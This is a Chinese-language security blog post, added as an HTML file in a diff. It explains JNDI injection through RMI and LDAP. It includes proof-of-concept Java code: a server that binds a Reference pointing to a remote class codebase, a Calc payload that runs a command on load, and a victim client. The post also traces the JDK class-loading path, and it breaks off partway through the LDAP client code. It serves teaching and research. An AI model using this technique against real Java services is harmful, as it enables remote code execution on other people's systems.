@@ -1,0 +1,1896 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next beep use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+  
+
+<link href="https://cdn.bootcss.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="java安全,JNDI," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="JNDI简介官方：JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。 我们需">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI注入原理分析">
+<meta property="og:url" content="http://1azy.icu/2023/04/15/JNDI-Injection/index.html">
+<meta property="og:site_name" content="1azysugar的博客">
+<meta property="og:description" content="JNDI简介官方：JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。 我们需">
+<meta property="og:locale">
+<meta property="og:image" content="http://1azy.icu/images/20230421201311.png">
+<meta property="og:image" content="http://1azy.icu/images/20230421205320.png">
+<meta property="og:image" content="http://1azy.icu/images/20230421212615.png">
+<meta property="og:image" content="http://1azy.icu/images/20230421225546.png">
+<meta property="og:image" content="http://1azy.icu/images/20230501224001.png">
+<meta property="og:image" content="http://1azy.icu/images/20230501224809.png">
+<meta property="og:image" content="http://1azy.icu/images/20230501224915.png">
+<meta property="og:image" content="http://1azy.icu/images/20230501225123.png">
+<meta property="og:image" content="http://1azy.icu/images/20230501225715.png">
+<meta property="og:image" content="http://1azy.icu/images/20230501230233.png">
+<meta property="og:image" content="http://1azy.icu/images/20230501230454.png">
+<meta property="og:image" content="http://1azy.icu/images/20230501230647.png">
+<meta property="og:image" content="http://1azy.icu/images/20230501230833.png">
+<meta property="og:image" content="http://1azy.icu/images/20230501231239.png">
+<meta property="og:image" content="http://1azy.icu/images/20230502000820.png">
+<meta property="og:image" content="http://1azy.icu/images/20230502001916.png">
+<meta property="og:image" content="http://1azy.icu/images/20230502002454.png">
+<meta property="og:image" content="http://1azy.icu/images/20230502002631.png">
+<meta property="og:image" content="http://1azy.icu/images/20230502003130.png">
+<meta property="og:image" content="http://1azy.icu/images/20230502005335.png">
+<meta property="og:image" content="http://1azy.icu/images/20230502005218.png">
+<meta property="og:image" content="http://1azy.icu/images/20230502010730.png">
+<meta property="og:image" content="http://1azy.icu/images/20230502170832.png">
+<meta property="og:image" content="http://1azy.icu/images/20230502171123.png">
+<meta property="article:published_time" content="2023-04-15T04:16:12.000Z">
+<meta property="article:modified_time" content="2023-06-02T20:29:26.969Z">
+<meta property="article:author" content="1azysugar">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="JNDI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://1azy.icu/images/20230421201311.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Beep',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":6,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://1azy.icu/2023/04/15/JNDI-Injection/"/>
+
+
+
+<!-- 文章加密 -->
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+		if (history.length === 1) {
+		    window.opener = null;
+		    window.open('', '_self');
+		    window.close();
+                } else {
+                    history.back();
+                }
+            }
+        }
+    })();
+</script>
+
+<!-- fontawesome5 -->
+<link href="/lib/font-awesome/css/fontawesome-all.min.css" rel="stylesheet" type="text/css" />
+
+  <title>JNDI注入原理分析 | 1azysugar的博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband">
+	<a href="https://github.com/lazysugar" target="_blank"><img style="position: absolute; top: 0; right: 0; border: 0;" src="/images/headband/forkme_right_red.png" alt="Fork me on GitHub"></a>
+    </div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">1azysugar的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">1azysugar的博客</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-question-circle"></i> <br />
+            
+            文章
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fas fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fas fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="far fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+    
+    <a href="https://github.com/lazysugar" class="github-corner" target="_blank" title="Follow me on GitHub" aria-label="Follow me on GitHub">
+      <svg width="80" height="80" viewBox="0 0 250 250" style="fill:#222; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+	<path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path>
+      </svg>
+    </a>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://1azy.icu/2023/04/15/JNDI-Injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="1azysugar的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">JNDI注入原理分析</h2>
+        
+
+        <div class="post-meta">
+	  
+	  
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar-plus"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-04-15T12:16:12+08:00">
+                2023-04-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">java安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <!--<i class="far fa-file-word"></i>-->
+		  <i class="fas fa-book-open"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文共计 &#58;</span>
+                
+                <span title="本文共计">
+                   字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="far fa-clock"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅文耗时 &asymp;</span>
+                
+                <span title="阅文耗时">
+                   min
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="JNDI简介"><a href="#JNDI简介" class="headerlink" title="JNDI简介"></a>JNDI简介</h1><p>官方：JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。</p>
+<p>我们需要知道的是：JNDI封装了对各种访问目录服务的逻辑，我们可以使用JNDI访问现有的目录服务和目录服务（JDBC，LDAP，RMI，NID，CORBA），以前访问这些服务时，针对不同的服务需要写不同的代码，有JNDI后代码实现基本一致。<br><img src="/images/20230421201311.png"><br>一些名词解释：<br>1）Naming Service 命名服务 命名服务将名称和对象进行关联，提供通过名称找到对象的操作。 例如：DNS系统将计算机名和IP地址进行关联。文件系统将文件名和文件句柄进行关联等等。</p>
+<p>2）Name 名称 要在命名系统中查找对象，需要提供对象的名称。对象的名称是用来标识该对象的易于人理解的名称。 例如：文件系统用文件名来标识文件对象。DNS系统用机器名来表示IP地址。</p>
+<p>3）Binding 绑定 一个名称和一个对象的关联称为一个绑定。 例如：文件系统中，文件名绑定到文件。DNS系统中，机器名绑定到IP地址。</p>
+<p>4）Reference 引用 在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。</p>
+<p>5）Context 上下文 一个上下文是一系列名称和对象的绑定的集合。一个上下文通常提供一个lookup操作来返回对象，也可能提供绑定，解除绑定，列举绑定名等操作。</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LDAP</td>
+<td>轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</td>
+</tr>
+<tr>
+<td>RMI JAVA</td>
+<td>远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</td>
+</tr>
+<tr>
+<td>DNS</td>
+<td>域名服务</td>
+</tr>
+<tr>
+<td>CORBA</td>
+<td>公共对象请求代理体系结构</td>
+</tr>
+</tbody></table>
+<p>#JNDI调用过程<br>（RMI为例）RMI的主要由三部分组成：</p>
+<ol>
+<li>RMI Registry 注册表：服务实例将被注册表注册到特定的名称中（registry.bind(String name, Remote obj)将对象绑定到rmi注册表）</li>
+<li>RMI Server 服务端</li>
+<li>RMI Client 客户端：客户端通过查询注册表来获取对应名称的对象引用，以及该对象实现的接口(lookup)</li>
+</ol>
+<p>RMI Client（JNDI程序）会去用封装好的访问方法（lookup）远程连接RMI Registry寻找对象，RMI Registry把引用返回，RMI Client接受到后先在本地找，找不到的话去与RMI Server进行tcp连接<br>所以服务端有两个端口：1）RMI Server端口，是被随机分配的2）RMI Registry端口，是我们可以指定的<br><img src="/images/20230421205320.png"><br>#JNDI两个方法<br> bind(String name, Object obj) 将name与obj进行绑定<br> lookup(String name) 通过name查找对象（可以远程）<br>当lookup可控时，漏洞出现</p>
+<h2 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h2><h3 id="RMI详解"><a href="#RMI详解" class="headerlink" title="RMI详解"></a>RMI详解</h3><p>RMI (Remote Method Invocation) 远程方法调用，是一种调用远程位置的对象来执行方法的思想。为了屏蔽网络通信的复杂性，RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用远端（Server）的目标类之前，也会经过一个对应的远端代理类，就是 Skeleton，它从 Stub 中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeletons 的调用对于 RMI 服务的使用者来讲是隐藏的，我们无需主动的去调用相关的方法。但实际的客户端和服务端的网络通信时通过 Stub 和 Skeleton 来实现的。<br><img src="/images/20230421212615.png"></p>
+<h2 id="过程拆解"><a href="#过程拆解" class="headerlink" title="过程拆解"></a>过程拆解</h2><ol>
+<li><p>创建远程对象。RemoteInterface remote &#x3D; new RemoteInterfaceImpl();</p>
+</li>
+<li><p>注册远程对象。registry.bind(“remote”, remote);</p>
+</li>
+<li><p>客户端访问服务器并查找远程对象。包括两个步骤：</p>
+<p> ①用interface定义要查找的远程对象，在第四步作为引用：RemoteInterface remote &#x3D; (RemoteInterface);</p>
+<p> ②查找远程对象。Naming.lookup(“rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;service”)</p>
+</li>
+<li><p>Registry返回服务器对象存根。也就是把远程对象service作为自己的service（引用），称为stub</p>
+</li>
+<li><p>调用远程方法。remote.sayHello(“ok”)</p>
+</li>
+<li><p>客户端存根和服务器骨架通信</p>
+</li>
+<li><p>骨架代理调用remote.sayHello(“ok”);，实际上是在Server端调用的</p>
+</li>
+<li><p>骨架把结果返回给存根</p>
+</li>
+<li><p>存根把结果返回给客户端</p>
+</li>
+</ol>
+<p>代码实现：</p>
+<p>定义一个能够远程调用的接口，继承 java.rmi.Remote 接口，这个接口中的所有方法都必须声明抛出 java.rmi.<br>RemoteException 异常</p>
+<pre><code>import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+public interface RemoteInterface extends Remote &#123;
+    public String sayHello(String name) throws RemoteException;
+&#125;
+</code></pre>
+<p>创建这个远程接口的实现类，这个类中是真正的执行逻辑代码，并且继承 java.rmi.server.UnicastRemoteObject 类,童谣所有方法抛出RemoteException</p>
+<blockquote>
+<p>在RMI中 UnicastRemoteObject类是与Object超类等效的,该类提供了equals( ) , hashcode( ), toString( )方法,继承UnicastRemoteObject类的子类在 export 时，会随机绑定一个端口，开始监听来自客户端（Stubs）的请求，即使不注册，直接请求这个端口也可以通信。如果不想让远程对象成为 UnicastRemoteObject 的子类，后面就需要主动的使用其静态方法 exportObject 来手动 export 对象。</p>
+</blockquote>
+<pre><code>import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class RemoteInterfaceImpl extends UnicastRemoteObject implements RemoteInterface &#123;
+    protected RemoteInterfaceImpl() throws RemoteException &#123;
+        super();
+    &#125;
+
+    @Override
+    public String sayHello(String name) throws RemoteException &#123;
+        return &quot;Hello &quot; + name;
+    &#125;
+&#125;
+</code></pre>
+<h3 id="RMI-registry"><a href="#RMI-registry" class="headerlink" title="RMI registry"></a>RMI registry</h3><p>Java RMI 设计了一个 注册表 （RMI registry） 的思想，当想要调用某个远程对象的方法时，通过该远程对象在注册时提供在注册表（registry）中的别名（Name），来让注册表（registry）返回该远程对象的引用，后续通过该引用实现远程方法调用。由 java.rmi.registry.Registry 和 java.rmi.Naming 来实现。</p>
+<p>Naming 提供了查询（lookup）、绑定（bind）、重新绑定（rebind）、接触绑定（unbind）、list（列表）用来对注册表进行操作。这个类提供的每个方法都有一个 URL 格式的参数，格式如下： <strong>&#x2F;&#x2F;host:port&#x2F;name</strong>：</p>
+<ul>
+<li>host 表示注册表所在的主机</li>
+<li>port 表示注册表接受调用的端口号，默认为 1099</li>
+<li>name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键字</li>
+</ul>
+<p>从下面的java.rmi.Naming#lookup源码可以看出，这些方法调用 <strong>LocateRegistry.getRegistry</strong> 方法获取了 Registry 接口的实现类，并调用其相关方法进行实现的</p>
+<pre><code>public static Remote lookup(String name)
+    throws NotBoundException,
+        java.net.MalformedURLException,
+        RemoteException
+&#123;
+    ParsedNamingURL parsed = parseURL(name);
+    Registry registry = getRegistry(parsed);
+
+    if (parsed.name == null)
+        return registry;
+    return registry.lookup(parsed.name);
+&#125;
+</code></pre>
+<p>使用 LocateRegistry#createRegistry() 方法来创建注册中心,将待调用的类进行绑定:</p>
+<pre><code>import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.Naming;
+
+public class RMIService &#123;
+    public static void main(String[] args) throws Exception&#123;
+
+        // 创建一个rmi映射表
+        Registry registry = LocateRegistry.createRegistry(1099);
+        // 创建一个对象
+        RemoteInterface remote = new RemoteInterfaceImpl();
+        // 将对象绑定到rmi注册表
+        registry.bind(&quot;remote&quot;, remote);
+
+    &#125;
+&#125;
+</code></pre>
+<p>Client端进行调用，</p>
+<pre><code>import javax.naming.Context;
+import javax.naming.InitialContext;
+import java.util.HashMap;
+import java.util.Properties;
+
+public class RMIClient &#123;
+    public static void main(String[] args) throws Exception&#123;
+
+        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常
+        Properties env = new Properties();
+        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+        env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);
+
+        // 创建初始化环境
+        Context ctx = new InitialContext(env);
+        //  jndi的方式获取远程对象
+        RemoteInterface remote = (RemoteInterface) ctx.lookup(&quot;rmi://localhost:1099/remote&quot;);
+        // 调用远程对象的方法
+        System.out.println(remote.sayHello(&quot;ok&quot;));
+    &#125;
+
+&#125;
+</code></pre>
+<p>先运行RMIService，之后启动RMIClient端，成功调用了远程对象的方法。<br><img src="/images/20230421225546.png"></p>
+<blockquote>
+<p>更多扩展请查看<a href="Java_RMI.md">Java_RMI</a></p>
+</blockquote>
+<h3 id="攻击JNDI"><a href="#攻击JNDI" class="headerlink" title="攻击JNDI"></a>攻击JNDI</h3><p>JNDI实际就是对RMI的方法进行了封装，JNDI的本质就是RMI服务端攻击RMI客户端。不同的是，JDNI运行获取一个特性的对象：远程引用对象————Reference。</p>
+<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
+<p>JNDI客户端可以加载远程的RMI服务的class文件来进行实例化。通过lookup指定一个远程服务，远程服务是通过Reference来远程加载类文件。这样就可以对JNDI客户端进行攻击。加载远程类的时候static静态代码块,代码块,无参构造函数和getObjectInstance方法都会被调用。</p>
+<p>在使用Reference时，我们可以直接将对象传入构造方法中，当被调用时，对象的方法就会被触发，创建Reference实例时几个比较关键的属性：</p>
+<p>className：远程加载时所使用的类名；</p>
+<p>classFactory：加载的class中需要实例化类的名称；</p>
+<p>classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file&#x2F;ftp&#x2F;http等协议；</p>
+<p>当然，要把一个对象绑定到rmi注册表中，这个对象需要继承UnicastRemoteObject，但是Reference没有继承它，所以我们还需要封装一下它，</p>
+<ol>
+<li>用 ReferenceWrapper 包裹一下Reference实例对象，这样就可以将其绑定到rmi注册表，并被远程访问到了。</li>
+<li>通过JDNI的bind方法去绑定Reference对象，底层会帮我们自动封装成ReferenceWrapper</li>
+</ol>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>RMIServer，我们的恶意服务端，remote绑定着我们的应用对象ReferenceWrapper或者使用JNDI的方法去绑定，这里我选择了后者</p>
+<pre><code>public class RMIServer &#123;
+    public static void main(String[] args) throws Exception &#123;
+        // 创建一个对象
+        RemoteInterface remote = new RemoteInterfaceImpl();
+        // 创建一个rmi映射表
+        Registry registry = LocateRegistry.createRegistry(1099);
+        // 将对象绑定到rmi注册表
+        registry.bind(&quot;remote&quot;, remote);
+
+    &#125;
+&#125;
+</code></pre>
+<p>JNDIRMIServer，运用JNDI封装的方法去rebind</p>
+<pre><code>public class JNDIRMIServer &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+
+        InitialContext initialContext = new InitialContext();
+
+        Reference reference = new Reference(&quot;Calc&quot;, &quot;Calc&quot;, &quot;http://localhost:7777/&quot;);
+
+        initialContext.rebind(&quot;rmi://localhost:1099/remote&quot;,reference);
+
+    &#125;
+&#125;
+</code></pre>
+<p>HTTP 端恶意载荷（Calc.java）代码，由Reference引用</p>
+<pre><code>public class Calc &#123;
+
+    public Calc() throws Exception &#123;
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    &#125;
+    
+&#125;
+</code></pre>
+<p>JNDIRMICilent，受害者客户端</p>
+<pre><code>public class JNDIRMICilent &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+
+        InitialContext initialContext = new InitialContext();
+
+        RemoteInterface remote = (RemoteInterface)initialContext.lookup(&quot;rmi://localhost:1099/remote&quot;);
+
+        System.out.println(remote.sayHello(&quot;OK&quot;));
+    &#125;
+&#125;
+</code></pre>
+<p>运行顺序：RMIServer-&gt;JNDIRMIServer-&gt;http.server-&gt;JNDIRMICilent</p>
+<p><img src="/images/20230501224001.png"></p>
+<h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>跟进InitialContext#lookup(java.lang.String)，会调用GenericURLContext#lookup(java.lang.String)</p>
+<p><img src="/images/20230501224809.png"></p>
+<p>GenericURLContext#lookup(java.lang.String)会调用RegistryContext#lookup(javax.naming.Name)，不同的协议有不同的xxxContext</p>
+<p><img src="/images/20230501224915.png"></p>
+<p>RegistryContext#lookup底层还是调用rmi原生的RegistryImpl_Stub#lookup，获取到ReferenceWrapper对象，去decodeObject</p>
+<p><img src="/images/20230501225123.png"></p>
+<p>com.sun.jndi.rmi.registry.RegistryContext#decodeObject先获取到Wapper中的Reference，然后调用NamingManager#getObjectInstance，这时已经走出rmi协议的逻辑，来到通用的类加载逻辑，说明类加载和rmi协议无关，可能存在两个攻击面</p>
+<p><img src="/images/20230501225715.png"></p>
+<p>NamingManager#getObjectInstance重要的是会调用NamingManager#getObjectFactoryFromReference，从Reference中获取对象工厂</p>
+<p><img src="/images/20230501230233.png"></p>
+<p>首先会从本地找，本地没找到，然后通过codebase找，进入VersionHelper#loadClass(java.lang.String, java.lang.String)</p>
+<p><img src="/images/20230501230454.png"></p>
+<p>VersionHelper#loadClass(java.lang.String, java.lang.String)：</p>
+<p><img src="/images/20230501230647.png"></p>
+<p>com.sun.naming.internal.VersionHelper12#loadClass(java.lang.String, java.lang.ClassLoader)，这里就会去从URLClassPath下去找Calc类，这时initialize为true，表示初始化加载，如果恶意代码写在静态代码块的话就会被执行，我们是写在构造器，没有执行</p>
+<p><img src="/images/20230501230833.png"></p>
+<p>return返回回到NamingManager#getObjectFactoryFromReference，clas.newInstance进行实例化，弹出Calc</p>
+<p><img src="/images/20230501231239.png"></p>
+<p>总结攻击面：</p>
+<ol>
+<li>RegistryContext中会调用原生RMI中的方法</li>
+<li>NamingManager中的类加载</li>
+</ol>
+<h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h3><p>在jdk8u113以上后，rmi协议因为trustURLCodebase默认为false后无法利用，但是可以利用LDAP协议</p>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>ComLDAPServer，创建一个普通的ldap服务ComLDAPServer</p>
+<pre><code>public class ComLDAPServer &#123;
+    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
+    public static void main(String[] args) throws IOException &#123;
+        int port = 1234;
+        try &#123;
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                    &quot;listen&quot;, //$NON-NLS-1$
+                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+            config.setSchema(null);
+            config.setEnforceAttributeSyntaxCompliance(false);
+            config.setEnforceSingleStructuralObjectClass(false);
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            ds.add(&quot;dn: &quot; + &quot;dc=example,dc=com&quot;, &quot;objectClass: top&quot;, &quot;objectclass: domain&quot;);
+
+
+            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$
+            ds.startListening();
+
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>JNDILDAPServer，用JNDI rebind，将恶意的引用绑定上去</p>
+<pre><code>public class JNDILDAPServer &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+
+        InitialContext initialContext = new InitialContext();
+
+        Reference reference = new Reference(&quot;Calc&quot;, &quot;Calc&quot;, &quot;http://localhost:7777/&quot;);
+
+        initialContext.rebind(&quot;ldap://localhost:1234/cn=test,dc=example,dc=com&quot;,reference);
+    &#125;
+&#125;
+</code></pre>
+<p>HTTP 端恶意载荷（Calc.java）代码，由Reference引用</p>
+<pre><code>public class Calc &#123;
+
+    public Calc() throws Exception &#123;
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    &#125;
+    
+&#125;
+</code></pre>
+<p>LDAPClient，受害者客户端</p>
+<pre><code>public class LDAPClient &#123;
+    public static void main(String[] args) throws NamingException&#123;
+        String url = &quot;ldap://localhost:1234/cn=test,dc=example,dc=com&quot;;
